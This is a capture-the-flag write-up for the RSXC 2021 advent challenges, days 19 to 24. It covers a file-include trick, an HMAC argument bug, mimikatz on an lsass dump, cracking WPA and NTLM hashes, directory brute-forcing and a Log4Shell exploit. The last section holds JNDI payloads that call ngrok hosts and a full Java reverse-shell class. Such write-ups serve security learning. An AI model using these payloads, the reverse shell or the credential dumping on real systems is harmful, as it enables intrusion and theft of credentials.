### Challenge

> We felt that the our last xmas cards weren't that inclusive. So we made even more options, so everyone has one that fits them!
> http://rsxc.no:20019

### Solution

Similar to the challenge from day 17, we are greeted with a page containing different xmas cards after navigting to the website. However, different from the previous challenge, there is no source code to be found at the directory `/files`. The only text files we could see was `flag.txt`, `santa.txt`, `snowmen.txt` and `tree.txt`. Again, we don't have permission to open `flag.txt` just as last time.

Testing the application and opening the `xmas tree` card for instance, we see that we are directed to the url: `http://rsxc.no:20019/card.php?card=dHJlZS50eHQ=`, the same php file `card.php` as last time with the GET request of `?card=dHJlZS50eHQ=`. This time, the GET requests seems to be something that resembles a base64 encoded string. After trying to decode the base64, I could guess how the challenge could be solved as the encryption is just base64'ing the desired file input at the directory `/files`.

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ echo dHJlZS50eHQ= | base64 -d
tree.txt
```

Since we can control the GET request input of `card`, reading the flag is as easy as requesting for the file `flag.txt` encoded in base64:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ curl -s http://rsxc.no:20019/card.php?card=$(echo -n "flag.txt" | base64) | grep "RSXC"
RSXC{It_is_not_smart_to_let_people_include_whatever_they_want}
```

The flag is: `RSXC{It_is_not_smart_to_let_people_include_whatever_they_want}`

## [DAY 20] Easy mistakes

### Challenge

> When programming, it is easy to make simple mistakes, and some of them can have dire consequences.
> http://rsxc.no:20020

### Solution

Upon navigating to the site we are greeted with the source code of the challenge:

```php
This is the code found in /api.php
<?php

$data = json_decode(file_get_contents('php://input'), true);

if(!isset($data['hmac']) || !isset($data['host'])) {
  header("HTTP/1.0 400 Bad Request");
  exit;
}
$secret = getenv("SECRET");
$flag = getenv("FLAG");

$hmac = hash_hmac($data["host"], $secret, "sha256");

if ($hmac != $data['hmac']){
  header("HTTP/1.0 403 Forbidden");
  exit;
}

echo $flag;
```

Looking at the code we can see that the api path takes in two inputs as JSON body requests, `hmac` and `host`. Upon receiving the correct body input, it signs the `host` input with a secret using the hashing algorithm `sha256` and comparing the result with the `hmac` input. The flag is then outputted if these two values compared are the same. However, what the application did not take into consideration is that we have control over both the unsigned value that is to be signed, and the result of the signed. This means that sending in an empty value/string on both inputs, ie. signing an empty message results in an empty message, would give us the flag:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ curl --data '{"host":"", "hmac":""}' --header 'Content-Type: application/json' http://rsxc.no:20020/api.php
RSXC{You_have_to_have_the_right_order_for_arguments!}
```

The flag is: `RSXC{You_have_to_have_the_right_order_for_arguments!}`

## [DAY 21] Nice memories

### Challenge

> Note: The flag is the clear text password for river-security-xmas user.
> On a IR mission we found that the threatactor dumped lsass file.
> Can you rock our world and find the flag for us?
> https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip

### Solution

We are given a system dump of the lsass file. To make it easier for myself, as this was a Windows dump, I opted to use mimikatz on my Windows PC to dump the passwords from the memory dump file `lsass.DMP` instead of my usual linux setup _(this is due to not having an instance of kali linux ready)_.

```shell
$ .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump lsass.DMP
Switch to MINIDUMP : 'lsass.DMP'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.DMP' file for minidump...

Authentication Id : 0 ; 1304254 (00000000:0013e6be)
Session           : Interactive from 2
User Name         : river-security-xmas
Domain            : DESKTOP-V1MQH3P
Logon Server      : WIN-QC6FTBKEEE9
Logon Time        : 2021-11-12 13:29:30
SID               : S-1-5-21-2640804858-4017698289-1413954960-1001
        msv :
         [00000003] Primary
         * Username : river-security-xmas
         * Domain   : DESKTOP-V1MQH3P
         * NTLM     : 7801ee9c5762bb027ee224d54cb8f62e
         * SHA1     : bebad302f8e64b59279c3a6747db0e076800d9ca
...
```

After getting the NTLM hash (`7801ee9c5762bb027ee224d54cb8f62e`) of the password for the user `river-security-xmas` through mimikatz. With the hint of `Can you rock our world and find the flag for us?`, hinting to the use of `rockyou.txt`, I bruteforced the password of this hash using `john-the-ripper` (a password cracking tool running on the CPU):

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ echo "7801ee9c5762bb027ee224d54cb8f62e" > hash
juki@izone:~/Desktop/ctf/rsxc2021$ john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 XOP 4x2])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alliwantforchristmasisyou (?)
1g 0:00:00:01 DONE (2021-12-21 13:08) 0.7462g/s 7621Kp/s 7621Kc/s 7621KC/s alliwantisy0oh..allitaite10
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

The flag is: `alliwantforchristmasisyou`

## [DAY 22] Wireless communication

### Challenge

> We tried to find a new way of sending the flag, and this time it is even encrypted! Since we are nice we will even give you a hint. The password starts with S. Can you Rock our world?
> https:///rsxc.no/5512383c4c02768617233eefdd4f79efe5dea9d08a850c8414644abf296845cf/22-challenge.cap

### Solution

We are given a pcap file containing some WPA network sniffed packet. Along with the hint of `"Can you Rock our world?"`, hinting to the usage of `rockyou.txt`. I guessed we could recover or bruteforce the password starting with an `S` for this network for us to read the encrypted data. Since I didn't have any computer with GPU on hand, bruteforcing with a tool running with CPU such as `john-the-ripper` or `aircrack-nk` was the only choice. I chose to go with the latter, `aircrack-ng` (an 802.11 WEP and WPA/WPA2-PSK key cracking program), for this job.

In order to make the bruteforcing a lot faster, I narrowed down the wordlist of rockyou by filtering out the passwords starting with an uppercase `S` through a quick python script:

```python
f2 = open("filtered.txt", "a")
with open("/usr/share/wordlists/rockyou.txt", "rb") as f:
    a = [x for x in f.readlines()]
    for line in a:
        try:
            if line[0] == 83: # "S"
                f2.write(line.decode())
        except:
            pass
f2.close()
```

After having filtered out and produced a smaller wordlist, retrieving the password of the network is just as simple as running the following command:

```
juki@izone:~/Desktop/ctf/rsxc2021$ aircrack-ng 22-challenge.cap -w filtered.txt
Reading packets, please wait...
Opening 22-challenge.cap
Read 63 packets.

   #  BSSID              ESSID                     Encryption

   1  1A:2F:49:69:AA:0A  Private                   WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening 22-challenge.cap
Read 63 packets.

1 potential targets



                               Aircrack-ng 1.6

      [00:01:28] 97735/98553 keys tested (1118.76 k/s)

      Time left: 0 seconds                                      99.17%

                         KEY FOUND! [ Santaclaws99 ]


      Master Key     : 98 91 0D 48 C4 92 05 45 42 CB 4C AF 72 3B 11 C8
                       EA EB BE 40 FD 9A 01 E8 43 D8 A2 F0 AD 36 37 DD

      Transient Key  : 77 3D 16 7F 4D C5 78 93 1F C9 2C 58 1F 82 9A 6C
                       A7 FF 49 BB 44 20 9C 07 D5 BD 72 B7 0E 47 39 51
                       AD 5D DA 9D AD D8 87 6F DE 5E 86 F5 33 FB 8B 18
                       4B FD D7 06 8D 6C 8A 34 36 77 D7 E1 AA 7F 93 8E

      EAPOL HMAC     : 7C 95 55 6F 18 39 03 44 43 64 CD D0 AB 25 89 0B


```

The password we retrieved is: `Santaclaws99`.

In order to read the encoded pcap network data in wireshark now, we have to add in the password of the network as the decryption key. This can be done in preferences:
`Edit > Preferences… > Protocols > IEEE 802.11 > Decription keys > Edit`
![wireshark decryption key preferences](https://i.imgur.com/f1wYfVS.png)
![wireshark decryption key added](https://i.imgur.com/ya1nPMb.png)

Adding the password, we can now see some TCP packets being sent. The flag is found after following that said TCP packet.
![wireshark flag output](https://i.imgur.com/6GndJFX.png)

The flag is: `RSXC{WIFI_is_fun}`

## [DAY 23] Locating the location

### Challenge

> We seem to have lost a file, can you please help us find it?
> http://rsxc.no:20023

### Solution

Upon navigating to the site, we are greeted with a text saying that a `flag.txt` file was lost in a subfolder on the server hosting the site. The directory name is said to also be found in dirb's `small.txt` wordlist, and that the functionality of directory listing is not enabled, meaning we will receive a status code of 200 whatever directory we search for.

From this I could guess that this challenge was of content discovery and directory bruteforcing, and was thus the approach I began to try. Knowing that the directory listing is not enabled, I knew that I couldn't run the wordlist as it is, but have to somehow manipulate it by directly searching for the file `flag.txt`. This was done by modifying the wordlist a little by appending the path `/flag.txt` to every line in the wordlist. A quick python script for this can be seen here:

```python
f2 = open("small.txt", "a")
with open("/usr/share/wordlists/dirb/small.txt", "r") as f:
    a = [x.strip() for x in f.readlines()]
    for line in a:
        try:
            f2.write(line+"/flag.txt"+"\n")
        except:
            pass
f2.close()
```

Running `gobuster`, a directory bruteforcing tool, on the modified wordlist and then outputting the results of the body length (response length) to a file, I can search for the flag as a response with a response length different from the others:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ gobuster -fw -u http://rsxc.no:20023/ -w small.txt -l -o result
juki@izone:~/Desktop/ctf/rsxc2021$ head result -n 10
/03/flag.txt (Status: 200) [Size: 20]
/10/flag.txt (Status: 200) [Size: 20]
/01/flag.txt (Status: 200) [Size: 20]
/00/flag.txt (Status: 200) [Size: 20]
/1/flag.txt (Status: 200) [Size: 20]
/100/flag.txt (Status: 200) [Size: 20]
/1000/flag.txt (Status: 200) [Size: 20]
/123/flag.txt (Status: 200) [Size: 20]
/0/flag.txt (Status: 200) [Size: 20]
/02/flag.txt (Status: 200) [Size: 20]
juki@izone:~/Desktop/ctf/rsxc2021$ grep -v "Size: 20" result # since [Size: 20] should indicate the message "404 - File not found"
/logfile/flag.txt (Status: 200) [Size: 120]
juki@izone:~/Desktop/ctf/rsxc2021$ curl -s http://rsxc.no:20023/logfile/flag.txt | grep -Eo "RSXC{.*}"
RSXC{Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag}
```

The flag is: `RSXC{Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag}`

## [DAY 24] The watcher

### Challenge

> We have found a service that watches our every step, are you able to figure out how we can read the FLAG from the environment? NB. Container will be restarted every 30 minutes.
> http://rsxc.no:20024

### Solution

Looking at the challenge description I could guess from the get go that it was going to be about the new vulnerability known as Log4Shell (`CVE-2021-44228`) affecting the Java logging package `log4j`. To confirm this, navigating to the site, we are greeted with the sentence of `Be careful, I'm logging everything...` hinting to some form of `logging`. Fuzzing for some directories such as `http://rsxc.no:20024/test` for instance, results in a `Whitelabel Error Page` due to not having set up a dedicated error page yet. Googling this tells us that we are indeed working with a Java web application, running on Spring Boot:

> WhiteLabel Error Page is a generic Spring Boot error page that is displayed when no custom error page is present.

Using the site https://log4j-tester.trendmicro.com/ I can test for locations suitable for the JNDI attack vector, and further finds that most of the user-supplied data and headers could actually be exploited as "everything is being logged". For this case, I used the User-Agent header. To further test this for ourselves, preparing a netcat listener, and then curl'ing the site with the JNDI payload results in a connection:

```shell
juki@peko:~$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 127.0.0.1 53502
0
 `�
```

```shell
juki@izone:~$ curl -H 'User-Agent: ${jndi:ldap://4.tcp.ngrok.io:14996/a}' 'http://rsxc.no:20024'
```

The site is indeed confirmed to be vulnerable to Log4Shell!

To exploiting the server, I setup my attack chain like so:

1. Begin with a payload of `${jndi:ldap://localhost:1389/Exploit}` that reaches our LDAP Referral Server
2. Our LDAP Referral Server then forwards the request to a secondary HTTP server http://localhost:8000/Exploit.class
3. The victim server will then retrieve and execute the code present in http://localhost:8000/Exploit.class, making it possible to run arbitrary code and command we send in

Utilizing both the tool localtunnel (`lt -port 8000`) and ngrok (`ngrok tcp 1389`), I can expose my localhost connection to the Internet freely using two computers hosting the local servers for the attack. The following tunnel forwarding is in this case, as such:

```
# Computer 1
tcp://8.tcp.ngrok.io:16405 -> localhost:1389 # LDAP Referral Server
http://calm-warthog-89.loca.lt -> localhost:8000 # HTTP server

# Computer 2
tcp://4.tcp.ngrok.io:14996 -> localhost:9001 # Netcat reverse shell
```

First, with the [marshalsec utility](https://github.com/mbechler/marshalsec), I start my LDAP referral server to direct connections to my secondary HTTP server:

```shell
juki@izone:~/Desktop/ctf/rsxc2021/marshalsec$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://calm-warthog-89.loca.lt/#Exploit"
Listening on 0.0.0.0:1389
```

Following that I set up the HTTP server, and also start the netcat listener on the other computer:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..
```

```shell
juki@peko:~$ nc -lvnp 9001
Listening on 0.0.0.0 9001
```

Having all the servers correctly up and running, the finishing touches for the attack payload would be to fix up the code for the exploit (`Exploit.class`) and then running a curl to the server with our attack payload. A exploit code solution for a reverse shell can be seen below:

```java
// Exploit.java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

	public Exploit() throws Exception {
		String host="4.tcp.ngrok.io";
		int port=14996;
		String cmd="/bin/sh";
		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
		Socket s=new Socket(host,port);
		InputStream pi=p.getInputStream(),
								pe=p.getErrorStream(),
								si=s.getInputStream();
		OutputStream po=p.getOutputStream(),so=s.getOutputStream();
		while(!s.isClosed()) {
			while(pi.available()>0)
				so.write(pi.read());
			while(pe.available()>0)
				so.write(pe.read());
			while(si.available()>0)
				po.write(si.read());
			so.flush();
			po.flush();
			Thread.sleep(50);
			try {
				p.exitValue();
				break;
			}
			catch (Exception e){
			}
		};
		p.destroy();
		s.close();
	}
}
```

Having everything ready and set up, we run our attack:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ javac Exploit.java -source 8 -target 8
warning: [options] bootstrap class path not set in conjunction with -source 8
1 warning
juki@izone:~/Desktop/ctf/rsxc2021$ curl -H 'User-Agent: ${jndi:ldap://8.tcp.ngrok.io:16405/Exploit}' 'http://rsxc.no:20024'

```

Upon running the two commands above, we receive a reverse shell on our netcat listener and can freely `cat` the flag:

```shell
juki@peko:~$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 127.0.0.1 53624
ls
app
bin
dev
etc
flag.txt
home
lib
media
mnt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat flag.txt
RSXC{We_do_like_logging_right?}
env
JAVA_ALPINE_VERSION=8.181.13-r0
HOSTNAME=040a0b24af81
LD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjdk/jre/../lib/amd64
SHLVL=1
HOME=/root
JAVA_VERSION=8u181
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
LANG=C.UTF-8
JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk
PWD=/
FLAG=base32_KJJVQQ33K5SV6ZDPL5WGS23FL5WG6Z3HNFXGOX3SNFTWQ5B7PU
```

The flag is: `RSXC{We_do_like_logging_right?}`
